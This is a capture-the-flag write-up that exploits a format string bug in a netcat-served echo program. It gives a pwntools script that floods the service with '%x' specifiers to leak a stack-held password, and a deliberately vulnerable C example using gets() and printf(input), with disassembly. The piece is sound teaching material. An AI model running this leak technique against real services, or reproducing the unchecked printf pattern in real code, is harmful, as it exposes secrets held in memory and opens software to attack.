---
title: "Bleed the Stack"
link: "https://0x0539.net/play/fangorn/bleedthestack"
description: "An amateur programmer decides that for his hello world program, he will echo whatever you say. Can you find his mistake?"
author: "0x0539"
date: "2023-05-16"
published: true
area: "ctf"
tags: ["binex"]
---

# Bleed the Stack

<aside>
<a href={link}>{title} @ {author}</a><br/>
An amateur programmer decides that for his hello world program, he will echo whatever you say. Can you find his mistake?
</aside>

## Identifying a vulnerability

This challenge is based around a command-line program served over `netcat`. Passing the challenge url and port to `nc`, the challenge responds with the following
and prompts us for input:

```bash
pls@RUBY ~ > nc challenges.0x0539.net 7070
ADVANCED CHALLENGE :: BLEED THE STACK
*****************************

Test me! Enter your name and I'll print it back to you!
```

We can enter a string value, and the program will respond to our input with our exact input.

Given the challenge's name, it seems likely that this challenge's flag is hidden in the program's call stack - we can test this by sending a hexadecimal format string parameter, `%x`:

```bash
# ...

Test me! Enter your name and I'll print it back to you!
%x %x %x %x %x %x %x %x
40 f7f77620 1 0 1 20656854 73736170 64726f77
```

We get hex values as the response, which means the program is likely assembled from code containing a [format string bug](https://owasp.org/www-community/attacks/Format_string_attack) (I go over
this bug in a little more detail after the challenge walkthrough).

To confirm this, we can convert the hexadecimal values to ASCII, yielding the (malformed) string `@÷÷v [f7f77620] ehTssapdrow` (noting that `[f7f77620]` is invalid as ASCII;
the information here is intended to be read by a CPU and so is not necessarily human-readable text).

The string `ehTssapdrow` stands out as some form of actual text - it's 'little-endian' ordering of the ascii string `The password`.

## Exploiting the vulnerability

We can automate an exploit with the `pwntools` python module:
- open a connection to the `netcat` server,
- send loads of '%x' format specifiers when prompted for input,
- and finally parse and decode the response.

Considering that some byte arrays may not translate to valid ASCII representations (such as the aforementioned `f7f77620`), we can handle any errors by simply ignoring these as unnecessary.

```python
from pwn import *

context.log_level = "CRITICAL"
host, port = "challenges.0x0539.net", 7070
format_str = "%x " * 299


def decode_bytes(dword: bytes) -> str:
    try:
        # reverse byte order after hex conversion to
        # account for little-endian encoding
        decoded = bytes.fromhex(dword).decode("ascii")[::-1]
        return "".join([ch for ch in decoded if 32 <= ord(ch) <= 126])

    except UnicodeDecodeError:
        # return unchanged array if it can't be decoded
        print(f"UnicodeDecodeError on byte array '{dword}'.\n")
        return f" {dword} "


def main():
    s = remote(host, port)
    s.recvuntil(b"you!\n")
    s.sendline(format_str)
    raw_bytes = s.recvall().decode().strip()

    # print raw bytes from stack to stdout
    print(f"\nbyte array:\n{raw_bytes}\n")
    dwords = raw_bytes.split(" ")

    # pad incorrect array lengths
    dwords = [dword.zfill(8) for dword in dwords]
    decoded_dwords = "".join([decode_bytes(dword) for dword in dwords])

    print(f"leaked:\n{decoded_dwords}")


main()
```

The initial leaked output from this program's call stack gives us the following raw hex:

```
40 f7f20620 1 0 1 20656854 73736170 64726f77 3a736920 6c5f4920 5f337630 6d723066 625f7434 733675 25207825 78252078 20782520 25207825 78252078 20782520 25207825
```

Which our script will parse, decoding ASCII strings from their hexadecimal values:

```
@ f7f20620 The password is: [flag redacted] %x %x %x %x %x %x %x %x %x %
```

## On the format string bug

To investigate this bug a little further, we can use the following example `C` source code for a program similar to our target binary:

```c
#include <stdio.h>

int main(void) {

    char secret[7] = "secret";
    char input[32]; // buffer to store user input

    printf("input something to be repeated:\n");

    gets(input); // read from stdin
    printf(input); // print input to stdout

    return 0;
}
```

### Reading from the stack

Simplifying some low-level functionality a bit, the gist of the compiled instructions might look something like the following:

- do some setup before calling the `main()` function,
- allocate a 7-byte buffer on the stack - 6-byte string, 'secret', plus a null byte to denote the end of the string,
- allocate another 32-byte buffer for the user input below the secret for input from `gets()`.
- print a hardcoded prompt
- read user input from `stdin`, storing that data into the section of `input` memory,
- repeat the value of `input` back to the user
- hit the base of `main()`s stack frame and return to calling stack frame.

```nasm
; ............
.text:0000000000001169 ; __unwind {
.text:0000000000001169                 push    rbp
.text:000000000000116A                 mov     rbp, rsp
.text:000000000000116D                 sub     rsp, 64
.text:0000000000001171                 mov     rax, fs:40
.text:000000000000117A                 mov     [rbp+var_8], rax
.text:000000000000117E                 xor     eax, eax
.text:0000000000001180                 mov     [rbp+var_37], 1919116659
.text:0000000000001187                 mov     [rbp+var_37+3], 7628146
.text:000000000000118E                 lea     rax, s          ; "input something to be repeated:"
.text:0000000000001195                 mov     rdi, rax        ; s
.text:0000000000001198                 call    _puts
.text:000000000000119D                 lea     rax, [rbp+format]
.text:00000000000011A1                 mov     rdi, rax
.text:00000000000011A4                 mov     eax, 0
.text:00000000000011A9                 call    _gets
.text:00000000000011AE                 lea     rax, [rbp+format]
.text:00000000000011B2                 mov     rdi, rax        ; format
.text:00000000000011B5                 mov     eax, 0
.text:00000000000011BA                 call    _printf
.text:00000000000011BF                 mov     eax, 0
.text:00000000000011C4                 mov     rdx, [rbp+var_8]
.text:00000000000011C8                 sub     rdx, fs:28h
.text:00000000000011D1                 jz      short locret_11D8
.text:00000000000011D3                 call    ___stack_chk_fail
.text:00000000000011D8
.text:00000000000011D8 locret_11D8:                            ; CODE XREF: main+68↑j
.text:00000000000011D8                 leave
.text:00000000000011D9                 retn
```
> A compiler will make its own optimizations (modern security settings are also enabled for this binary), and then a disassembler will make further assumptions, but the general idea is there.

While this `gets()` call leaves the program vulnerable to a buffer overflow, the relevant point of interest here is the `printf()` call - `printf()` is not explicitly told the expected format of
`input`, or how many arguments to expect. This means if `input` contains any format specifiers, it will call each specifier as an argument, continuing to read values from the stack past its
allocated buffer.

To demonstrate this, the following explicitly passes both
1. the number of intended arguments and their format - `%s` (as in **s**tring),
2. the intended argument holding the value, `input`:

```c
// ...

    printf("%s", input);

// ...
```

### Modern computers and binary security

Most modern compilers and CPUs will compile security settings into a binary - e.g, Relocation Read-Only (`RELRO`), No-Execute (`NX`) bits, Address Space Layout Randomization (`ASLR`), stack canaries, Position-Independent Executable (`PIE`) - into ELF binaries as a way to 'harden' them, with the general goal
of making common/simple vulnerabilities harder to exploit. Automatic protections like these were likely **specifically** disabled by this challenge's creator given its goal.

For example, here we compile and run the example `C` program with a basic `gcc` command. This means it compiles with default settings, and not only are we notified of the potential danger around the `gets()` function, but a range of protections
are compiled into our binary by default (see the `pwn checksec` output). As an example, note that we trigger the compiler's stack canary when we try to exploit this program using format specifiers in a similar way, causing it to send a `SIGIOT` signal to the process,
killing execution:

```bash
$ gcc fstring_bug.c
fstring_bug.c: In function ‘main’:
fstring_bug.c:10:5: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
   10 |     gets(input); // read from stdin
      |     ^~~~
      |     fgets
/usr/bin/ld: /tmp/cc0Q5Rm3.o: in function `main':
fstring_bug.c:(.text+0x41): warning: the `gets' function is dangerous and should not be used.

$ pwn checksec a.out
[*] '/home/please/Documents/scripts/a.out'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

$ ./a.out
input something to be repeated:
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
*** stack smashing detected ***: terminated
[1]    141503 IOT instruction (core dumped)  ./a.out
```

Note that there are ways around these protections, but the methodology becomes more complex than sending a long string of format specifiers.
